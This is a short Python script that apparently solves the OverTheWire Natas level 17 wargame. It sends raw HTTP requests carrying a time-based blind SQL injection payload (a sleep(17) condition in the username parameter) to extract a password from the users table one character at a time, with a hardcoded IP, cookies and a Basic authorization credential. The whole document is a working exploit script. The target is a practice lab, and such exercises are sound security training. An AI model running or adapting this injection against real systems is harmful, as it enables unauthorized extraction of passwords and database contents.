import socket
import time

array = ""
for x in range(1, 50):
    for y in "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/=":
        send = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        send.connect(('178.79.134.250', 80))
        data = "GET /?debug=1&username=\"+or+ascii((select+substr((select+password+from+users+limit+3,+1),+" + str(x) +",+1)))+!=+ascii('" + y + "')+or+sleep(17)+" + "+%23 HTTP/1.1\r\n"
        data += "Host: natas17.natas.labs.overthewire.org\r\n"
        data += "Cookie: __cfduid=dd268278e25e6a2d33a5f0fcca5f072541488501913; __utma=176859643.273939219.1488501915.1488501915.1488501915.1; __utmz=176859643.1488501915.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)\r\n"
        data += "Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==\r\n"
        data += "\r\n"
        time1 = time.time()
        send.send(data.encode())
        recv = send.recv(1500)
        
        if time.time() - time1 > 15:
            array += y
            break
        send.close()

    print(array)

